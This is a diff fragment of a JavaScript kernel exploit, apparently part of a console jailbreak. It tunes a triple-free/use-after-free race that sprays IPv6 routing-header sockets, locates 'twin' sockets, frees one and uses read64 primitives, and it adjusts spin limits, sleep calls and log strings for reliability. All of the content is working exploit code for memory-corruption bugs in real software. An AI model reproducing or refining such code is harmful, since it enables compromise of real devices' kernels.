@@ -119,7 +119,7 @@ var IOV_THREAD_NUM = 8;
 var UIO_THREAD_NUM = 8;
 var MAIN_LOOP_ITERATIONS = 3;
 var TRIPLEFREE_ITERATIONS = 4;
- var MAX_KQ = 4000;
+ var MAX_KQ = 3000;
 var MAX_ROUNDS_TWIN = 10;
 var MAX_ROUNDS_TRIPLET = 120;
 var MAIN_CORE = 4;
@@ -477,22 +477,13 @@ function wait_for(addr, threshold) {
   if (!(threshold instanceof BigInt)) {
     threshold = new BigInt(0x0, threshold);
   }
-
-  let spins = 0;
-  const MAX_SPINS = 30000;
-
+  var spins = 0;
+  var MAX_SPINS = 700000;
   while (!read64(addr).eq(threshold)) {
-
-    // Micro‑yield خفيف جدًا
-    // بيقلل الضغط على الـ CPU
-    // من غير ما يعمل delay حقيقي
-    for (let i = 0; i < 150; i++) {
-      // spin خفيف
-    }
-
+    nanosleep_fun(2);
     spins++;
     if (spins >= MAX_SPINS) {
-      log("wait_for: timeout waiting for " + hex(addr));
+      log('wait_for: timeout waiting for ' + hex(addr));
       break;
     }
   }
@@ -824,7 +815,7 @@ function find_twins() {
       if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j && j >= 0 && j < ipv6_socks.length) {
         twins[0] = i;
         twins[1] = j;
-        log('Twins found: [' + i + '] [' + j + ']');
+        log('TWINS : [' + i + '] [' + j + ']');
         return true;
       }
     }
@@ -1369,7 +1360,7 @@ function trigger_triplefree() {
       close(new BigInt(uaf_socket));
       continue;
     }
-    log('Triple Free Running...');
+    log('GLITCHING...');
 
     // 9) free واحدة من التوأم
     free_rthdr(ipv6_socks[twins[1]]);
